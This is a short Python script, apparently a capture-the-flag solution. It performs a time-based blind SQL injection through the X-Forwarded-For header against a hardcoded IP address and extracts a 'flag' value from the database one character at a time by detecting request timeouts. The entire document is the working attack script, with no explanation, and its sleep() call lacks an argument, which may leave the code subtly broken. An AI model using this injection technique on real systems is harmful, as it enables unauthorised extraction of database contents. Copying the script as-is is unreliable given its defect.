import requests
import string
words = string.lowercase + string.uppercase + string.digits
url = 'http://120.24.86.145:8002/web15/'
answer=''
for length in range(1,100):
    flag=0
    for key in words:
        data = "'+(select case when (substring((select flag from flag) from {0} for 1)='{1}') then sleep() else 1 end) and '1'='1".format(length,str(key))
        headers={
            "X-FORWARDED-FOR": data
        }
        try:
            res=requests.get(url,headers=headers,timeout=5)
        except Exception as e:
            answer+=key
            print answer
            flag=1
            break
    if flag==0 and answer!= '':
        break;

print answer
